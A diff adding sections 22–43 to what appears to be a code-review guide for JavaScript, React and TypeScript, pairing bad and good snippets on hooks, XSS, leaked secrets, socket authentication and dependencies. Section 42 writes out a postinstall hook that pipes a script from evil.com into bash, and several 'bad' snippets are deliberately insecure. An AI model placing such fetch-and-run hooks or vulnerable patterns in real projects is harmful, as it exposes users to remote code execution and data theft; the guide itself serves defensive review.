@@ -359,3 +359,355 @@ A comprehensive guide to idiomatic patterns, vulnerability detection, and perfor
   ```js
   execFile("git", ["checkout", req.query.branch]); // Argument vector execution
   ```
+
+---
+
+## 22. React Stale Closures
+- **Signal**: Callbacks or effects referencing state variables without updating or re-subscribing when values change.
+- **Bad**:
+  ```jsx
+  useEffect(() => {
+    const timer = setInterval(() => {
+      setCount(count + 1); // Reads stale count from initial render closure
+    }, 1000);
+    return () => clearInterval(timer);
+  }, []);
+  ```
+- **Good**:
+  ```jsx
+  useEffect(() => {
+    const timer = setInterval(() => {
+      setCount(prev => prev + 1); // Functional state update
+    }, 1000);
+    return () => clearInterval(timer);
+  }, []);
+  ```
+
+---
+
+## 23. Missing or Excessive useEffect Dependencies
+- **Signal**: Disabling `react-hooks/exhaustive-deps` or omitting referenced props and state from the dependency array.
+- **Bad**:
+  ```jsx
+  useEffect(() => {
+    fetchOrders(userId); // Missing userId in dependency array
+  }, []);
+  ```
+- **Good**:
+  ```jsx
+  useEffect(() => {
+    fetchOrders(userId);
+  }, [userId]);
+  ```
+
+---
+
+## 24. State Updates During Render
+- **Signal**: Invoking a state setter unconditionally inside the component render body, triggering immediate re-render and infinite loop.
+- **Bad**:
+  ```jsx
+  function Header({ user }) {
+    if (!user) setLoggedOut(true); // Triggers infinite render loop
+    return <div>Header</div>;
+  }
+  ```
+- **Good**:
+  ```jsx
+  function Header({ user }) {
+    useEffect(() => {
+      if (!user) setLoggedOut(true);
+    }, [user]);
+    return <div>Header</div>;
+  }
+  ```
+
+---
+
+## 25. Direct State Mutation
+- **Signal**: Mutating state arrays or objects directly instead of creating new references via spreads or immutability helpers.
+- **Bad**:
+  ```jsx
+  items.push(newItem);
+  setItems(items); // React fails to re-render because array reference is identical
+  ```
+- **Good**:
+  ```jsx
+  setItems(prev => [...prev, newItem]);
+  ```
+
+---
+
+## 26. Missing Cleanup in Effects
+- **Signal**: Setting event listeners, intervals, or WebSocket subscriptions without returning a cleanup function in `useEffect`.
+- **Bad**:
+  ```jsx
+  useEffect(() => {
+    window.addEventListener("resize", onResize); // Memory leak on unmount
+  }, []);
+  ```
+- **Good**:
+  ```jsx
+  useEffect(() => {
+    window.addEventListener("resize", onResize);
+    return () => window.removeEventListener("resize", onResize);
+  }, []);
+  ```
+
+---
+
+## 27. Array Index as Key in Dynamic Lists
+- **Signal**: Passing the mapping index as `key={index}` to dynamic lists where items can be reordered, inserted, or removed.
+- **Bad**:
+  ```jsx
+  items.map((item, index) => <OrderItem key={index} data={item} />);
+  ```
+- **Good**:
+  ```jsx
+  items.map((item) => <OrderItem key={item.id} data={item} />);
+  ```
+
+---
+
+## 28. Asynchronous Fetch Races in Effects
+- **Signal**: Starting asynchronous fetches in `useEffect` without handling cancellation, allowing older responses to overwrite newer state.
+- **Bad**:
+  ```jsx
+  useEffect(() => {
+    fetchData(query).then(data => setData(data)); // Out-of-order resolution causes stale UI
+  }, [query]);
+  ```
+- **Good**:
+  ```jsx
+  useEffect(() => {
+    let active = true;
+    fetchData(query).then(data => {
+      if (active) setData(data);
+    });
+    return () => { active = false; };
+  }, [query]);
+  ```
+
+---
+
+## 29. dangerouslySetInnerHTML
+- **Signal**: Using `dangerouslySetInnerHTML` without sanitizing input via DOMPurify.
+- **Bad**:
+  ```jsx
+  <div dangerouslySetInnerHTML={{ __html: product.description }} />
+  ```
+- **Good**:
+  ```jsx
+  <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(product.description) }} />
+  ```
+
+---
+
+## 30. Secret Exposure via Frontend Env Prefixes
+- **Signal**: Storing private keys, database passwords, or server credentials in variables prefixed with `NEXT_PUBLIC_` or `VITE_`.
+- **Bad**:
+  ```
+  NEXT_PUBLIC_STRIPE_SECRET_KEY=sk_live_1234567890
+  ```
+- **Good**:
+  ```
+  STRIPE_SECRET_KEY=sk_live_1234567890
+  NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY=pk_live_1234567890
+  ```
+
+---
+
+## 31. TypeScript any Propagation
+- **Signal**: Utilizing `any` to bypass type errors, disabling compiler safety downstream.
+- **Bad**:
+  ```ts
+  function parseConfig(raw: any) {
+    return raw.nested.value; // No compile-time guarantees
+  }
+  ```
+- **Good**:
+  ```ts
+  function parseConfig(raw: unknown) {
+    if (typeof raw === "object" && raw !== null && "nested" in raw) {
+      return (raw as { nested: { value: string } }).nested.value;
+    }
+    throw new Error("Invalid config shape");
+  }
+  ```
+
+---
+
+## 32. Non-Null Assertions
+- **Signal**: Using `!` to bypass null and undefined compiler checks without runtime validation.
+- **Bad**:
+  ```ts
+  const user = findUser(id);
+  sendEmail(user!.email); // Crashes at runtime if user is undefined
+  ```
+- **Good**:
+  ```ts
+  const user = findUser(id);
+  if (!user) throw new NotFoundError("User not found");
+  sendEmail(user.email);
+  ```
+
+---
+
+## 33. Unsafe Type Casts
+- **Signal**: Forcing incompatible types with `as unknown as T` to sidestep structural type checks.
+- **Bad**:
+  ```ts
+  const data = (payload as unknown as ValidatedData);
+  ```
+- **Good**:
+  ```ts
+  const data = ValidatedDataSchema.parse(payload);
+  ```
+
+---
+
+## 34. Non-Strict TypeScript Configuration
+- **Signal**: `tsconfig.json` with `"strict": false` or `"strictNullChecks": false`.
+- **Bad**:
+  ```json
+  { "compilerOptions": { "strict": false } }
+  ```
+- **Good**:
+  ```json
+  { "compilerOptions": { "strict": true, "noImplicitAny": true, "strictNullChecks": true } }
+  ```
+
+---
+
+## 35. Realtime Socket Connection Authentication
+- **Signal**: Accepting WebSocket or Socket.IO connections without validating session tokens or JWTs during the handshake.
+- **Bad**:
+  ```js
+  io.on("connection", (socket) => { /* unauthenticated client receives events */ });
+  ```
+- **Good**:
+  ```js
+  io.use((socket, next) => {
+    const token = socket.handshake.auth.token;
+    try {
+      socket.user = verifyToken(token);
+      next();
+    } catch (err) {
+      next(new Error("Authentication error"));
+    }
+  });
+  ```
+
+---
+
+## 36. Room-Join Authorization
+- **Signal**: Permitting clients to emit `joinRoom` events with arbitrary room IDs without checking tenant ownership.
+- **Bad**:
+  ```js
+  socket.on("join", (roomId) => socket.join(roomId)); // Attacker eavesdrops on any tenant
+  ```
+- **Good**:
+  ```js
+  socket.on("join", async (roomId) => {
+    if (await canAccessRoom(socket.user.id, roomId)) {
+      socket.join(roomId);
+    }
+  });
+  ```
+
+---
+
+## 37. Trusting Client-Sent User IDs in Socket Events
+- **Signal**: Relying on `{ senderId: req.body.id }` received in event payloads rather than `socket.user.id`.
+- **Bad**:
+  ```js
+  socket.on("chat", (data) => broadcast(data.fromUserId, data.message)); // Identity spoofing
+  ```
+- **Good**:
+  ```js
+  socket.on("chat", (data) => broadcast(socket.user.id, data.message));
+  ```
+
+---
+
+## 38. Unbounded Realtime Fan-Out
+- **Signal**: Broadcasting high-frequency messages to thousands of connected clients synchronously on the event loop.
+- **Bad**:
+  ```js
+  for (const client of allClients) client.send(payload); // Blocks event loop on 50k connections
+  ```
+- **Good**:
+  ```js
+  // Utilize Redis pub-sub with clustered workers
+  redisClient.publish("global_feed", JSON.stringify(payload));
+  ```
+
+---
+
+## 39. Socket Disconnect Cleanup Leaks
+- **Signal**: Failing to remove event listeners, timers, or peer references when clients disconnect.
+- **Bad**:
+  ```js
+  const activeUsers = new Map();
+  io.on("connection", (s) => activeUsers.set(s.id, s)); // Never removed on disconnect
+  ```
+- **Good**:
+  ```js
+  io.on("connection", (s) => {
+    activeUsers.set(s.id, s);
+    s.on("disconnect", () => activeUsers.delete(s.id));
+  });
+  ```
+
+---
+
+## 40. Message Ordering in Asynchronous Consumers
+- **Signal**: Consuming sequenced messages (e.g., chat, ledger) concurrently without partitioning by entity key.
+- **Bad**:
+  ```js
+  pubsub.subscribe("orders", async (msg) => {
+    await processOrder(msg); // Order of operations can race and swap
+  });
+  ```
+- **Good**:
+  ```js
+  // Partition by orderId ensuring strictly sequential per-order processing
+  ```
+
+---
+
+## 41. Wildcard Versions in package.json
+- **Signal**: Using `*` or `latest` in `dependencies` or `devDependencies`.
+- **Bad**:
+  ```json
+  "dependencies": { "express": "*" }
+  ```
+- **Good**:
+  ```json
+  "dependencies": { "express": "^4.21.1" }
+  ```
+
+---
+
+## 42. Malicious Postinstall Scripts
+- **Signal**: Dependencies declaring `postinstall` commands executing curl or arbitrary shell scripts.
+- **Bad**:
+  ```json
+  "scripts": { "postinstall": "curl -s https://evil.com/setup.sh | bash" }
+  ```
+- **Good**:
+  ```json
+  "scripts": { "postinstall": "node scripts/build-native.js" }
+  ```
+
+---
+
+## 43. Unused and Vulnerable Dependencies
+- **Signal**: Retaining abandoned packages with known critical vulnerabilities in `package.json`.
+- **Bad**:
+  ```json
+  "dependencies": { "event-stream": "3.3.6" } // Known malicious package
+  ```
+- **Good**:
+  ```json
+  // Remove unused packages and run npm audit
+  ```
